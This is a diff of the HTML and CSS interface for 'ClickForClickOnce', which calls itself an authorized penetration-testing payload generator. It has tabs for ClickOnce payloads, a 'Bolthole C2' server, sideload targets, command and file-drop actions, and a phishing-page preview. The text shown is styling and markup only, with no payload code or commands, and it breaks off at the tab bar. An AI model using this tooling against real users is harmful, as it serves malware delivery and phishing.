@@ -1,1598 +1,1034 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>ClickForClickOnce</title>
-        <script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.0/Sortable.min.js"></script>
-        <style>
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-
-            body {
-                font-family: -apple-system, BlinkMacSystemFont, avenir next, avenir, segoe ui, helvetica neue, helvetica, Cantarell, Ubuntu, roboto, noto, arial, sans-serif;
-                background-color: #1a1a1a;
-                color: #e0e0e0;
-                line-height: 1.6;
-                padding: 40px 20px;
-                min-height: 100vh;
-                overflow-x: hidden;
-                display: flex;
-                justify-content: center;
-                align-items: flex-start;
-            }
-
-            body:before {
-                content: "";
-                display: block;
-                position: fixed;
-                width: 100%;
-                height: 100%;
-                left: 0;
-                top: 0;
-                z-index: -1;
-                background-color: rgba(0, 0, 0, 0.9);
-            }
-
-            .main-container {
-                max-width: 800px;
-                width: 100%;
-                background-color: rgba(255, 255, 255, 0.05);
-                border-radius: 8px;
-                border: 1px solid #333;
-                padding: 40px;
-                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            }
-
-            h1 {
-                font-size: 2.5rem;
-                font-weight: 600;
-                margin-bottom: 20px;
-                color: #fbfbfc;
-                text-align: center;
-            }
-
-            .description {
-                font-size: 1rem;
-                margin-bottom: 30px;
-                color: #b0b0b0;
-                text-align: center;
-            }
-
-            h2 {
-                font-size: 1.4rem;
-                font-weight: 400;
-                margin-bottom: 15px;
-                color: #ffffff;
-                border-bottom: 1px solid #333;
-                padding-bottom: 10px;
-            }
-
-            a {
-                color: #d6deff;
-                font-weight: 600;
-            }
-
-            a:hover {
-                color: #ffffff;
-            }
-
-            input[type="text"], input[type="number"], input[type="file"], select, textarea {
-                background-color: #2a2a2a;
-                border: 1px solid #444;
-                color: #e0e0e0;
-                padding: 12px 16px;
-                border-radius: 4px;
-                width: 100%;
-                font-family: inherit;
-                font-size: 0.95rem;
-                margin-bottom: 10px;
-                transition: all 0.2s ease;
-            }
-
-            input[type="text"]:focus, input[type="number"]:focus, input[type="file"]:focus, select:focus, textarea:focus {
-                outline: none;
-                border-color: #d6deff;
-                background-color: #333;
-            }
-
-            input[type="file"] {
-                padding: 8px 12px;
-            }
-
-            textarea {
-                resize: vertical;
-                min-height: 60px;
-                font-family: 'Courier New', Courier, monospace;
-                font-size: 0.85rem;
-            }
-
-            button {
-                background-color: #d6deff;
-                color: #0f0f0f;
-                border: none;
-                padding: 12px 20px;
-                font-size: 0.95rem;
-                font-weight: 600;
-                border-radius: 4px;
-                cursor: pointer;
-                transition: all 0.2s ease;
-                font-family: inherit;
-            }
-
-            button:hover {
-                background-color: #ffffff;
-                transform: translateY(-1px);
-            }
-
-            button:active {
-                transform: translateY(0);
-            }
-
-            .green-btn {
-                background-color: #90e24a;
-                color: #0f0f0f;
-            }
-
-            .green-btn:hover {
-                background-color: #a0f25b;
-            }
-
-            .red-btn {
-                background-color: #e24a90;
-                color: #ffffff;
-            }
-
-            .red-btn:hover {
-                background-color: #f25ba0;
-            }
-
-            .grey-btn {
-                background-color: #555;
-                color: #ffffff;
-            }
-
-            .grey-btn:hover {
-                background-color: #666;
-            }
-
-            .section {
-                margin-bottom: 30px;
-            }
-
-            .radio-group {
-                margin-bottom: 20px;
-            }
-
-            .radio-option {
-                display: flex;
-                align-items: flex-start;
-                margin-bottom: 15px;
-                padding: 15px;
-                background-color: rgba(255, 255, 255, 0.03);
-                border-radius: 6px;
-                border: 1px solid #333;
-                transition: all 0.2s ease;
-            }
-
-            .radio-option:hover {
-                background-color: rgba(255, 255, 255, 0.05);
-                border-color: #444;
-            }
-
-            .radio-option input[type="radio"] {
-                width: auto;
-                margin-right: 12px;
-                margin-top: 0;
-                accent-color: #d6deff;
-                align-self: center;
-            }
-
-            .radio-option-content {
-                flex: 1;
-            }
-
-            .radio-option-title {
-                font-weight: 600;
-                color: #ffffff;
-                margin-bottom: 5px;
-            }
-
-            .radio-option-desc {
-                font-size: 0.85rem;
-                color: #b0b0b0;
-                line-height: 1.4;
-            }
-
-            .slider-container {
-                margin-bottom: 20px;
-            }
-
-            .slider-labels {
-                display: flex;
-                justify-content: space-between;
-                margin-bottom: 10px;
-                font-size: 0.9rem;
-                color: #b0b0b0;
-            }
-
-            .slider-value {
-                font-weight: 600;
-                color: #d6deff;
-            }
-
-            .slider {
-                -webkit-appearance: none;
-                width: 100%;
-                height: 8px;
-                border-radius: 5px;
-                background: #444;
-                outline: none;
-                transition: all 0.2s;
-            }
-
-            .slider:hover {
-                background: #555;
-            }
-
-            .slider::-webkit-slider-thumb {
-                -webkit-appearance: none;
-                appearance: none;
-                width: 20px;
-                height: 20px;
-                border-radius: 50%;
-                background: #d6deff;
-                cursor: pointer;
-                transition: all 0.2s ease;
-            }
-
-            .slider::-webkit-slider-thumb:hover {
-                background: #ffffff;
-                transform: scale(1.1);
-            }
-
-            .slider::-moz-range-thumb {
-                width: 20px;
-                height: 20px;
-                border-radius: 50%;
-                background: #d6deff;
-                cursor: pointer;
-                border: none;
-            }
-
-            .action-selector {
-                display: flex;
-                gap: 10px;
-                margin-bottom: 20px;
-                align-items: center;
-            }
-
-            .action-selector select {
-                flex: 1;
-                margin-bottom: 0;
-            }
-
-            .action-card {
-                background-color: rgba(255, 255, 255, 0.05);
-                border-radius: 6px;
-                padding: 20px;
-                margin-bottom: 15px;
-                border: 1px solid #444;
-                cursor: move;
-                transition: all 0.2s ease;
-            }
-
-            .action-card:hover {
-                background-color: rgba(255, 255, 255, 0.08);
-                border-color: #555;
-            }
-
-            .action-card-header {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                margin-bottom: 15px;
-            }
-
-            .action-card-title {
-                font-weight: 600;
-                color: #ffffff;
-                font-size: 1.1rem;
-            }
-
-            .drag-hint {
-                color: #666;
-                font-size: 0.8rem;
-                font-weight: normal;
-            }
-
-            .action-card-remove {
-                padding: 6px 12px;
-                font-size: 0.8rem;
-            }
-
-            .action-card-field {
-                margin-bottom: 15px;
-            }
-
-            .action-card-field:last-child {
-                margin-bottom: 0;
-            }
-
-            .field-label {
-                display: block;
-                color: #ffffff;
-                margin-bottom: 8px;
-                font-weight: 500;
-            }
-
-            .field-description {
-                color: #b0b0b0;
-                font-size: 0.85rem;
-                font-style: italic;
-                margin-bottom: 10px;
-                line-height: 1.4;
-            }
-
-            .form-row {
-                display: grid;
-                grid-template-columns: 1fr 1fr;
-                gap: 12px;
-            }
-
-            .form-row .form-field {
-                display: flex;
-                flex-direction: column;
-            }
-
-            .form-row .form-field input,
-            .form-row .form-field select {
-                margin-bottom: 0;
-            }
-
-            .overlay {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background-color: rgba(0, 0, 0, 0.8);
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                z-index: 1000;
-                flex-direction: column;
-            }
-
-            .spinner {
-                border: 4px solid rgba(255, 255, 255, 0.3);
-                border-radius: 50%;
-                border-top: 4px solid #d6deff;
-                width: 40px;
-                height: 40px;
-                animation: spin 1s linear infinite;
-                margin-bottom: 20px;
-            }
-
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-
-            .overlay-text {
-                color: #ffffff;
-                font-size: 1.2rem;
-            }
-
-            .results-section {
-                margin-top: 30px;
-                padding: 20px;
-                background-color: rgba(144, 226, 74, 0.1);
-                border: 1px solid #90e24a;
-                border-radius: 6px;
-            }
-
-            .results-title {
-                color: #ffffff;
-                font-size: 1.2rem;
-                font-weight: 600;
-                margin-bottom: 10px;
-            }
-
-            .result-link {
-                color: #90e24a;
-                word-break: break-all;
-            }
-
-            .bh-downloads {
-                display: flex;
-                flex-direction: column;
-                gap: 8px;
-                margin-bottom: 20px;
-            }
-
-            .bh-download-link {
-                display: flex;
-                align-items: center;
-                gap: 10px;
-                padding: 10px 14px;
-                background-color: rgba(144, 226, 74, 0.08);
-                border: 1px solid #90e24a;
-                border-radius: 4px;
-                color: #90e24a;
-                text-decoration: none;
-                font-family: 'Courier New', Courier, monospace;
-                font-size: 0.9rem;
-                font-weight: normal;
-                transition: background-color 0.2s;
-            }
-
-            .bh-download-link:hover {
-                background-color: rgba(144, 226, 74, 0.18);
-                color: #a0f25b;
-            }
-
-            .bh-download-link .dl-label {
-                color: #b0b0b0;
-                font-size: 0.8rem;
-                min-width: 90px;
-            }
-
-            .bh-checklist {
-                border-top: 1px solid rgba(144, 226, 74, 0.3);
-                padding-top: 16px;
-            }
-
-            .bh-checklist-title {
-                color: #ffffff;
-                font-weight: 600;
-                margin-bottom: 10px;
-            }
-
-            .bh-checklist ol {
-                padding-left: 20px;
-                color: #b0b0b0;
-                line-height: 1.8;
-                font-size: 0.9rem;
-            }
-
-            .bh-checklist ol li code {
-                background-color: rgba(255, 255, 255, 0.08);
-                padding: 2px 6px;
-                border-radius: 3px;
-                font-family: 'Courier New', Courier, monospace;
-                color: #d6deff;
-                font-size: 0.85rem;
-            }
-
-            .bh-ops-ref {
-                border-top: 1px solid rgba(144, 226, 74, 0.3);
-                padding-top: 16px;
-                margin-top: 16px;
-            }
-
-            .bh-ops-ref-title {
-                color: #ffffff;
-                font-weight: 600;
-                margin-bottom: 12px;
-            }
-
-            .bh-cmd-section {
-                margin-bottom: 14px;
-            }
-
-            .bh-cmd-label {
-                color: #b0b0b0;
-                font-size: 0.78rem;
-                text-transform: uppercase;
-                letter-spacing: 0.06em;
-                margin-bottom: 6px;
-            }
-
-            .bh-cmd-block {
-                background: rgba(0,0,0,0.4);
-                border: 1px solid #444;
-                border-radius: 4px;
-                padding: 10px 14px;
-                font-family: 'Courier New', Courier, monospace;
-                font-size: 0.82rem;
-                color: #90e24a;
-                white-space: pre;
-                overflow-x: auto;
-                cursor: pointer;
-                transition: border-color 0.15s;
-                line-height: 1.6;
-                user-select: text;
-            }
-
-            .bh-cmd-block:hover {
-                border-color: #90e24a;
-            }
-
-            .bh-cmd-block .cmd-comment {
-                color: #556;
-            }
-
-            .error-message {
-                margin-top: 20px;
-                padding: 15px;
-                background-color: rgba(226, 74, 144, 0.1);
-                border: 1px solid #e24a90;
-                border-radius: 6px;
-                color: #f25ba0;
-            }
-
-            .sortable-ghost {
-                opacity: 0.4;
-            }
-
-            .submit-section {
-                text-align: center;
-                margin-top: 40px;
-                padding-top: 30px;
-                border-top: 1px solid #333;
-            }
-
-            .submit-section.flex-row {
-                display: flex;
-                gap: 12px;
-                justify-content: center;
-            }
-
-            .submit-button {
-                font-size: 1.1rem;
-                padding: 15px 30px;
-                background-color: #4a90e2;
-                color: #ffffff;
-            }
-
-            .submit-button:hover {
-                background-color: #5ba0f2;
-            }
-
-            /* Tab bar */
-            .tab-bar {
-                display: flex;
-                gap: 4px;
-                margin-bottom: 30px;
-                border-bottom: 1px solid #333;
-                padding-bottom: 0;
-            }
-
-            .tab-btn {
-                background: transparent;
-                color: #b0b0b0;
-                border: none;
-                border-bottom: 2px solid transparent;
-                border-radius: 0;
-                padding: 10px 24px;
-                font-size: 1rem;
-                font-weight: 600;
-                cursor: pointer;
-                transform: none;
-                transition: color 0.2s, border-color 0.2s;
-                margin-bottom: -1px;
-            }
-
-            .tab-btn:hover {
-                color: #e0e0e0;
-                background: transparent;
-                transform: none;
-                border-bottom-color: #555;
-            }
-
-            .tab-btn.active {
-                color: #d6deff;
-                border-bottom-color: #d6deff;
-                background: transparent;
-            }
-
-            .tab-content {
-                display: none;
-            }
-
-            .tab-content.active {
-                display: block;
-            }
-
-            /* Bolthole step progress bar */
-            .bh-step-bar {
-                display: flex;
-                align-items: center;
-                margin-bottom: 28px;
-                padding-bottom: 20px;
-                border-bottom: 1px solid #333;
-            }
-
-            .bh-step-item {
-                display: flex;
-                align-items: center;
-                gap: 10px;
-                opacity: 0.35;
-                transition: opacity 0.2s;
-            }
-
-            .bh-step-item.active {
-                opacity: 1;
-            }
-
-            .bh-step-circle {
-                width: 28px;
-                height: 28px;
-                border-radius: 50%;
-                background: #444;
-                color: #999;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                font-weight: 700;
-                font-size: 0.85rem;
-                flex-shrink: 0;
-                transition: background 0.2s, color 0.2s;
-            }
-
-            .bh-step-item.active .bh-step-circle {
-                background: #d6deff;
-                color: #0f0f0f;
-            }
-
-            .bh-step-label {
-                font-weight: 600;
-                color: #b0b0b0;
-                font-size: 0.95rem;
-                transition: color 0.2s;
-            }
-
-            .bh-step-item.active .bh-step-label {
-                color: #ffffff;
-            }
-
-            .bh-step-line {
-                flex: 1;
-                height: 1px;
-                background: #444;
-                margin: 0 16px;
-            }
-
-            /* Dynamic key row */
-            .key-row {
-                display: flex;
-                gap: 8px;
-                align-items: flex-start;
-                margin-bottom: 8px;
-            }
-
-            .key-row textarea {
-                flex: 1;
-                margin-bottom: 0;
-                min-height: 52px;
-            }
-
-            .key-row-remove {
-                padding: 10px 12px !important;
-                font-size: 0.85rem !important;
-                flex-shrink: 0;
-                margin-top: 0 !important;
-            }
-
-            @media (max-width: 600px) {
-                body {
-                    padding: 20px 15px;
-                }
-
-                .main-container {
-                    padding: 20px;
-                }
-
-                h1 {
-                    font-size: 2rem;
-                }
-
-                .description {
-                    font-size: 0.9rem;
-                }
-
-                .action-selector {
-                    flex-direction: column;
-                    align-items: stretch;
-                }
-
-                .form-row {
-                    grid-template-columns: 1fr;
-                }
-
-                .submit-section.flex-row {
-                    flex-direction: column;
-                }
-            }
-        </style>
-    </head>
-    <body>
-        <!-- Processing Overlay -->
-        <div id="processingOverlay" class="overlay" style="display: none">
-            <div class="spinner"></div>
-            <p class="overlay-text">Building package...</p>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ClickForClickOnce</title>
+<script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.0/Sortable.min.js"></script>
+<style>
+/* ── Reset & base ── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg:       #0f1117;
+  --surface:  #181c27;
+  --surface2: #1f2435;
+  --border:   #2a2f45;
+  --accent:   #d6deff;
+  --accent2:  #8899ff;
+  --green:    #5ddb8b;
+  --red:      #e2607a;
+  --amber:    #f0b429;
+  --blue:     #4a90e2;
+  --text:     #d8dce8;
+  --text2:    #7880a0;
+  --radius:   8px;
+}
+html { font-size: 15px; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 40px 16px 80px;
+}
+
+/* ── App shell ── */
+.app { width: 100%; max-width: 860px; }
+
+/* ── Header ── */
+.app-header { text-align: center; margin-bottom: 36px; }
+.app-header .wordmark {
+  font-size: clamp(1.4rem, 4vw, 2rem);
+  font-weight: 700;
+  letter-spacing: -.5px;
+  color: var(--accent);
+}
+.app-header .tagline {
+  font-size: .82rem;
+  color: var(--text2);
+  margin-top: 4px;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+}
+
+/* ── Tab bar ── */
+.tab-bar {
+  display: flex; gap: 4px;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 4px;
+  margin-bottom: 24px;
+}
+.tab-btn {
+  flex: 1; padding: 10px 16px;
+  background: transparent; border: none;
+  border-radius: calc(var(--radius) - 2px);
+  color: var(--text2); font-size: .9rem; font-weight: 500;
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  transition: background .15s, color .15s;
+}
+.tab-btn:hover { background: var(--surface2); color: var(--text); }
+.tab-btn.active { background: var(--surface2); color: var(--accent); }
+.tab-btn svg { width: 16px; height: 16px; flex-shrink: 0; }
+
+/* ── Tab content ── */
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+/* ── Section cards ── */
+.section-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 16px; }
+.section-header { display: flex; align-items: center; gap: 10px; padding: 16px 20px; cursor: pointer; user-select: none; }
+.section-header .step-badge {
+  width: 24px; height: 24px; border-radius: 50%;
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--accent2); font-size: .75rem; font-weight: 700;
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+}
+.section-header .section-title { font-weight: 600; font-size: .95rem; flex: 1; }
+.section-header .chevron { color: var(--text2); transition: transform .2s; flex-shrink: 0; }
+.section-card.open .chevron { transform: rotate(180deg); }
+.section-body { display: none; padding: 0 20px 20px; border-top: 1px solid var(--border); padding-top: 18px; }
+.section-card.open .section-body { display: block; }
+
+/* ── Form elements ── */
+.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+.form-group { display: flex; flex-direction: column; gap: 6px; margin-bottom: 14px; }
+.form-group:last-child { margin-bottom: 0; }
+label { font-size: .8rem; color: var(--text2); font-weight: 500; text-transform: uppercase; letter-spacing: .6px; }
+input[type=text], input[type=number], textarea, select {
+  background: var(--bg); border: 1px solid var(--border); border-radius: 6px;
+  color: var(--text); font-size: .92rem; padding: 9px 12px;
+  width: 100%; outline: none; font-family: inherit; transition: border-color .15s;
+}
+input[type=text]:focus, input[type=number]:focus, textarea:focus, select:focus { border-color: var(--accent2); }
+select option { background: var(--surface); }
+textarea { resize: vertical; min-height: 70px; }
+
+/* ── Sideload card grid ── */
+.sideload-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+.sideload-card {
+  border: 1px solid var(--border); border-radius: 6px; padding: 12px 14px;
+  cursor: pointer; display: flex; align-items: flex-start; gap: 10px;
+  transition: border-color .15s, background .15s; background: var(--bg);
+}
+.sideload-card:hover { border-color: var(--accent2); background: var(--surface2); }
+.sideload-card.selected { border-color: var(--accent2); background: rgba(136,153,255,.08); }
+.sideload-card input[type=radio] { display: none; }
+.sideload-card-icon {
+  width: 32px; height: 32px; border-radius: 6px;
+  background: var(--surface2); display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0; font-size: 1rem;
+}
+.sideload-card-text .name { font-weight: 600; font-size: .88rem; color: var(--text); }
+.sideload-card-text .exe  { font-size: .75rem; color: var(--text2); margin-top: 2px; font-family: monospace; }
+
+/* ── Inflate slider ── */
+.slider-wrap { display: flex; align-items: center; gap: 12px; }
+input[type=range] {
+  -webkit-appearance: none; flex: 1; height: 4px; border-radius: 2px;
+  background: var(--border); outline: none; cursor: pointer; border: none; padding: 0;
+}
+input[type=range]::-webkit-slider-thumb {
+  -webkit-appearance: none; width: 16px; height: 16px;
+  border-radius: 50%; background: var(--accent); cursor: pointer;
+}
+.slider-val { min-width: 52px; text-align: right; font-size: .85rem; color: var(--accent); font-weight: 600; }
+
+/* ── Action cards ── */
+.action-controls { display: flex; gap: 10px; align-items: center; margin-bottom: 14px; }
+.action-controls select { flex: 1; }
+#actionCards { display: flex; flex-direction: column; gap: 10px; }
+.action-card { background: var(--bg); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+.action-card-header {
+  display: flex; align-items: center; gap: 10px; padding: 10px 14px;
+  background: var(--surface2); cursor: grab;
+}
+.action-card-header:active { cursor: grabbing; }
+.action-card-badge {
+  font-size: .72rem; font-weight: 700; padding: 2px 8px;
+  border-radius: 999px; text-transform: uppercase; letter-spacing: .5px;
+}
+.badge-run-code  { background: rgba(74,144,226,.2); color: var(--blue); }
+.badge-run-cmd   { background: rgba(226,96,122,.2); color: var(--red); }
+.badge-drop-file { background: rgba(240,180,41,.2); color: var(--amber); }
+.action-card-title { font-size: .88rem; font-weight: 600; flex: 1; }
+.action-card-body { padding: 14px; }
+.sortable-ghost { opacity: .4; }
+.btn-remove { background: none; border: none; color: var(--red); cursor: pointer; padding: 0; font-size: 1.1rem; line-height: 1; opacity: .7; }
+.btn-remove:hover { opacity: 1; }
+
+/* ── File input ── */
+.file-label {
+  display: flex; align-items: center; gap: 10px;
+  background: var(--bg); border: 1px dashed var(--border); border-radius: 6px;
+  padding: 10px 14px; cursor: pointer; font-size: .85rem; color: var(--text2);
+  transition: border-color .15s;
+}
+.file-label:hover { border-color: var(--accent2); color: var(--text); }
+.file-label input[type=file] { display: none; }
+.file-label .file-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+/* ── Key rows ── */
+.key-row { display: flex; gap: 8px; margin-bottom: 8px; }
+.key-row textarea { flex: 1; font-family: monospace; font-size: .8rem; }
+.key-row .btn-remove { align-self: center; }
+
+/* ── Buttons ── */
+.btn {
+  padding: 11px 22px; border-radius: 6px; border: none;
+  font-size: .92rem; font-weight: 600; cursor: pointer;
+  transition: opacity .15s, transform .1s;
+  display: inline-flex; align-items: center; gap: 8px;
+}
+.btn:active { transform: scale(.98); }
+.btn:disabled { opacity: .45; cursor: not-allowed; }
+.btn-primary  { background: var(--blue); color: #fff; }
+.btn-primary:hover:not(:disabled) { opacity: .88; }
+.btn-ghost { background: var(--surface2); border: 1px solid var(--border); color: var(--text); }
+.btn-ghost:hover:not(:disabled) { border-color: var(--accent2); color: var(--accent); }
+.btn-sm { padding: 7px 14px; font-size: .82rem; }
+
+/* ── Bolthole steps ── */
+.bh-step { display: none; }
+.bh-step.active { display: block; }
+.step-indicator {
+  display: flex; align-items: center; gap: 8px;
+  margin-bottom: 24px; font-size: .82rem; color: var(--text2);
+}
+.step-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--border); }
+.step-dot.done   { background: var(--green); }
+.step-dot.active { background: var(--accent2); }
+
+/* ── Info box ── */
+.infobox {
+  background: rgba(74,144,226,.08); border: 1px solid rgba(74,144,226,.25);
+  border-radius: 6px; padding: 12px 16px; font-size: .85rem;
+  color: var(--text2); margin-bottom: 16px;
+}
+.infobox strong { color: var(--blue); }
+
+/* ── Pubkey block ── */
+.pubkey-block {
+  background: var(--bg); border: 1px solid var(--border); border-radius: 6px;
+  padding: 12px; font-family: monospace; font-size: .75rem; color: var(--green);
+  word-break: break-all; cursor: text; line-height: 1.5;
+}
+.fingerprint { font-size: .72rem; color: var(--text2); margin-top: 6px; font-family: monospace; }
+
+/* ── Phish preview ── */
+.phish-select-row { display: flex; gap: 10px; align-items: center; }
+.phish-select-row select { flex: 1; }
+.phish-preview-wrap { display: none; border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin-top: 12px; }
+.phish-preview-wrap.visible { display: block; }
+.phish-preview-bar {
+  background: var(--surface2); padding: 6px 12px; font-size: .75rem;
+  color: var(--text2); display: flex; justify-content: space-between; align-items: center;
+}
+#phishPreviewFrame { width: 100%; height: 420px; border: none; background: #fff; display: block; }
+
+/* ── Build log modal ── */
+.modal-backdrop {
+  position: fixed; inset: 0; background: rgba(0,0,0,.75);
+  backdrop-filter: blur(4px); display: flex; align-items: center;
+  justify-content: center; z-index: 1000; padding: 20px;
+}
+.modal-backdrop.hidden { display: none; }
+.modal {
+  background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius);
+  width: 100%; max-width: 780px; max-height: 90vh;
+  display: flex; flex-direction: column; overflow: hidden;
+}
+.modal-header {
+  display: flex; align-items: center; gap: 12px; padding: 16px 20px;
+  border-bottom: 1px solid var(--border); flex-shrink: 0;
+}
+.modal-header h2 { font-size: 1rem; font-weight: 600; flex: 1; }
+.buildid-badge {
+  font-size: .72rem; font-family: monospace; color: var(--text2);
+  background: var(--surface2); border: 1px solid var(--border);
+  padding: 2px 8px; border-radius: 4px;
+}
+.modal-close { background: none; border: none; color: var(--text2); cursor: pointer; font-size: 1.3rem; line-height: 1; padding: 0; }
+.modal-close:hover { color: var(--text); }
+.log-status-bar {
+  display: flex; align-items: center; gap: 10px; padding: 8px 20px;
+  background: var(--surface2); border-bottom: 1px solid var(--border);
+  font-size: .78rem; color: var(--text2); flex-shrink: 0;
+}
+.log-pulse { width: 8px; height: 8px; border-radius: 50%; background: var(--amber); animation: pulse-anim 1s ease-in-out infinite; flex-shrink: 0; }
+.log-pulse.done  { background: var(--green); animation: none; }
+.log-pulse.error { background: var(--red);   animation: none; }
+@keyframes pulse-anim { 0%,100%{opacity:1} 50%{opacity:.3} }
+.log-body { flex: 1; overflow-y: auto; padding: 16px 20px; }
+#logContent { font-family: 'Consolas','Fira Mono',monospace; font-size: .78rem; color: var(--text2); white-space: pre-wrap; word-break: break-all; line-height: 1.7; }
+
+/* ── Results panel ── */
+.results-panel { padding: 16px 20px; border-top: 1px solid var(--border); background: var(--surface2); flex-shrink: 0; display: none; }
+.results-panel.visible { display: block; }
+.results-panel h3 { font-size: .82rem; font-weight: 600; text-transform: uppercase; letter-spacing: .8px; color: var(--text2); margin-bottom: 12px; }
+.result-links { display: flex; flex-wrap: wrap; gap: 10px; }
+.result-link {
+  display: inline-flex; align-items: center; gap: 7px; padding: 8px 14px;
+  background: var(--bg); border: 1px solid var(--border); border-radius: 6px;
+  text-decoration: none; font-size: .82rem; color: var(--green); font-weight: 500;
+  transition: border-color .15s;
+}
+.result-link:hover { border-color: var(--green); }
+.result-link svg { width: 14px; height: 14px; flex-shrink: 0; }
+
+/* ── Ops box ── */
+.ops-box {
+  background: var(--bg); border: 1px solid var(--border); border-radius: 6px;
+  padding: 14px 16px; margin-top: 12px; font-size: .8rem; color: var(--text2); line-height: 1.8;
+}
+.ops-box code { background: var(--surface2); padding: 1px 5px; border-radius: 3px; font-family: monospace; color: var(--accent); font-size: .78rem; }
+.ops-section { margin-top: 14px; }
+.ops-section:first-child { margin-top: 0; }
+.ops-label { font-size: .72rem; text-transform: uppercase; letter-spacing: .06em; color: var(--text2); margin-bottom: 5px; }
+.cmd-block {
+  background: var(--surface2); border: 1px solid var(--border); border-radius: 5px;
+  padding: 10px 12px; font-family: monospace; font-size: .78rem; white-space: pre; overflow-x: auto;
+  color: var(--text); cursor: pointer; user-select: text; line-height: 1.7;
+  transition: border-color .15s;
+}
+.cmd-block:hover { border-color: var(--accent2); }
+.cmd-block .cmd-comment { color: var(--text2); }
+
+/* ── Error banner ── */
+.error-banner { background: rgba(226,96,122,.1); border: 1px solid rgba(226,96,122,.3); border-radius: 6px; padding: 12px 16px; color: var(--red); font-size: .88rem; margin-top: 14px; display: none; }
+.error-banner.visible { display: block; }
+
+/* ── History tab ── */
+.history-empty { text-align:center; padding:48px 16px; color:var(--text2); font-size:.9rem; }
+.history-list { display:flex; flex-direction:column; gap:8px; }
+.history-row {
+  display:grid; grid-template-columns:140px 1fr auto auto auto; align-items:center;
+  gap:12px; background:var(--surface); border:1px solid var(--border); border-radius:8px;
+  padding:10px 14px; font-size:.82rem;
+}
+.history-ts { color:var(--text2); font-variant-numeric:tabular-nums; white-space:nowrap; }
+.history-id { font-family:monospace; color:var(--text1); font-size:.8rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.history-zip { color:var(--text2); font-size:.78rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+.status-badge {
+  display:inline-flex; align-items:center; gap:5px; padding:2px 9px; border-radius:20px;
+  font-size:.72rem; font-weight:600; white-space:nowrap; text-transform:uppercase; letter-spacing:.04em;
+}
+.status-badge.complete { background:rgba(144,226,74,.12); color:var(--green); border:1px solid rgba(144,226,74,.3); }
+.status-badge.failed   { background:rgba(226,74,144,.12); color:var(--red);   border:1px solid rgba(226,74,144,.3); }
+.status-badge.building { background:rgba(214,222,255,.1);  color:var(--accent);border:1px solid rgba(214,222,255,.2); }
+.history-actions { display:flex; gap:6px; }
+.btn-reopen { display:none; margin-left:8px; }
+.btn-reopen.visible { display:inline-flex; }
+.history-refresh-bar { display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; }
+.history-refresh-bar small { color:var(--text2); font-size:.78rem; }
+
+/* ── Responsive ── */
+@media (max-width: 600px) {
+  body { padding: 20px 12px 60px; }
+  .form-row { grid-template-columns: 1fr; }
+  .sideload-grid { grid-template-columns: 1fr; }
+  .result-links { flex-direction: column; }
+  .tab-btn span { display: none; }
+  .history-row { grid-template-columns:1fr auto; grid-template-rows:auto auto; }
+  .history-ts { grid-column:1; } .history-id { grid-column:1; }
+  .history-zip { display:none; }
+  .history-actions { grid-column:2; grid-row:1/3; }
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- Header -->
+  <header class="app-header">
+    <div class="wordmark">&#x25C6; ClickForClickOnce</div>
+    <div class="tagline">Authorized Penetration Testing Payload Generator</div>
+  </header>
+
+  <!-- Tab bar -->
+  <div class="tab-bar" role="tablist">
+    <button class="tab-btn active" id="tab-cfco" onclick="switchTab('cfco')">
+      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M4 1h8a2 2 0 012 2v10a2 2 0 01-2 2H4a2 2 0 01-2-2V3a2 2 0 012-2zm0 1a1 1 0 00-1 1v10a1 1 0 001 1h8a1 1 0 001-1V3a1 1 0 00-1-1H4zm1 2h6v1H5V4zm0 2h6v1H5V6zm0 2h4v1H5V8z"/></svg>
+      <span>ClickOnce</span>
+    </button>
+    <button class="tab-btn" id="tab-bolthole" onclick="switchTab('bolthole')">
+      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 1a6 6 0 110 12A6 6 0 018 2zm-1 3v4h2V5H7zm0 5v1.5h2V10H7z"/></svg>
+      <span>Bolthole C2</span>
+    </button>
+    <button class="tab-btn" id="tab-history" onclick="switchTab('history')">
+      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 1a6 6 0 110 12A6 6 0 018 2zM7.5 4v4.25l3 1.5.5-.87-2.5-1.25V4H7.5z"/></svg>
